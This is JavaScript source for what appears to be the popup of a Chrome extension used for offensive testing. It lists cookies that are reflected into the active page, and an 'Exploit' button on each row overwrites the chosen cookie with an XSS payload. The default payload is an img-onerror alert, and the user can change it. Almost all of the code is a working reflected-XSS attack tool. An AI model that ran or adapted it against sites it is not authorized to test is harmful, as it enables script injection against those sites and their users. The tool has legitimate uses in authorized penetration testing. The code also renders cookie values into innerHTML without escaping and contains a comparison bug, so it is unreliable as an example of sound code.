let tbody = document.getElementById('tbody')
let payloadvalue = "\"><img src=x onerror=alert(00)>";
var allcookiesreflected;



const button = document.querySelector("#button");
const save = document.querySelector("#save")
const messageBox = document.querySelector("#message");
button.addEventListener("click", ()=>{
  messageBox.removeAttribute("disabled")  

});
save.addEventListener("click", ()=>{
  payloadvalue = messageBox.value;
  messageBox.setAttribute("disabled", "true")
 
 
});

chrome.runtime.onMessage.addListener(gotMessage);

function gotMessage(message, sender, sendResponse) {


  // Received Array Of Cookies From content.js
  if (message.reflectedCookies) {

      console.log("Thank You we Recieved The Cookies")
      allcookiesreflected = message.reflectedCookies;

    let i = 0;
    while (allcookiesreflected[i]) {
    console.log("this is refelct"+JSON.stringify(allcookiesreflected[i]))
    console.log("wooooooooow thsi base64 "+ allcookiesreflected[i].base)
       

    tbody.innerHTML += `
        <tr>
          <td data-title='Cookie Name'>
           ${allcookiesreflected[i].name}
          </td>
          <td data-title='Value' >        
            ${allcookiesreflected[i].value}
          </td> 
          <td data-title='Base' id='base' >  
          ${allcookiesreflected[i].base || '--'}                 
          </td>        
          <td class='select' >
           <button class='button' id="select">Exploit</button>           
          </td>
        </tr> `
        // if (allcookiesreflected[i].base) {
        //   let base = document.querySelector("#base");
        //   base.innerHTML = 

        // }
       
       i++;
     }
  };

  // function for update Cookie , when Click on exploit button > so here we send the name of the Cookie we want to chage it To background.js
  document.querySelectorAll('#select').forEach(b => {
    b.addEventListener('click', () => {
      let nameCookie = b.parentNode.parentNode.firstChild.nextSibling.innerHTML;
      let valueCookie = b.parentNode.parentNode.firstChild.nextSibling.nextElementSibling.innerHTML;
      let filternameCookie = nameCookie.toString().replace(/(\r\n|\n|\r)/gm, "").replace(/^\s+|\s+$/g, '');;
      let filtervalueCookie = valueCookie.toString().replace(/(\r\n|\n|\r)/gm, "").replace(/^\s+|\s+$/g, '');;

      alert('Hi You , want to change value \"'+filtervalueCookie+'\" of Cookie \"'+filternameCookie+"\"with injected pyload => "+payloadvalue )
      for (let arrayofonecookie of allcookiesreflected) {
   
        console.log(arrayofonecookie.name);
        // console.log('Thank you we recieved your Cookie name to change it and is ' + message.nameCookie
        let check1 = arrayofonecookie.name;
        let check2 = arrayofonecookie.value;
      
        if ( check1 = filternameCookie && check2 == filtervalueCookie ) {
          // console.log("we find your Cookie and , now we try to change it "+filternameCookie)
          let payload = payloadvalue;         
          let namecookie = arrayofonecookie.name;         
          let nameed = namecookie.toString().replace(/(\r\n|\n|\r)/gm, "").replace(/^\s+|\s+$/g, '');;
          let domaincookie = arrayofonecookie.domain;
          let domained = domaincookie.toString().replace(/(\r\n|\n|\r)/gm, "").replace(/^\s+|\s+$/g, '');;
          let httpOnlycookie = arrayofonecookie.httpOnly;
          let pathcookie = arrayofonecookie.path;
          let pathed = pathcookie.toString().replace(/(\r\n|\n|\r)/gm, "").replace(/^\s+|\s+$/g, '');;
          let sameSitecookie = arrayofonecookie.sameSite;
          let sameSited = sameSitecookie.toString().replace(/(\r\n|\n|\r)/gm, "").replace(/^\s+|\s+$/g, '');;
          let securecookie = arrayofonecookie.secure;
          let storeIdcookie = arrayofonecookie.storeId;
          let storeIded = storeIdcookie.replace(/(\r\n|\n|\r)/gm, "").replace(/^\s+|\s+$/g, '');;  
          // console.log('thsi the valueeeeeeeees'+nameed+"_"+httpOnlycookie+"_"+sameSited+"_"+securecookie)
          chrome.runtime.sendMessage({
            nameed: nameed,
            updateCookie: "true",
            // domained: domained,
            httpOnlycookie: httpOnlycookie,
            pathed: pathed,
            sameSited: sameSited,
            securecookie: securecookie,
            // storeIded: storeIded,
            payload: payload,
            valueCookie: filtervalueCookie
    
          });
          break;
      
        }
    
      
      
      }
      
    
    });
  });


}

// Requesting Reflected Cookies from the content.js
window.addEventListener('DOMContentLoaded', () => {

  
  let msg = {
    run: "true"
    };
  
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs){
    chrome.tabs.sendMessage(tabs[0].id, msg);  
    console.log('Thank You We send Request to content .js to retrieve the Cookies ')
});



})






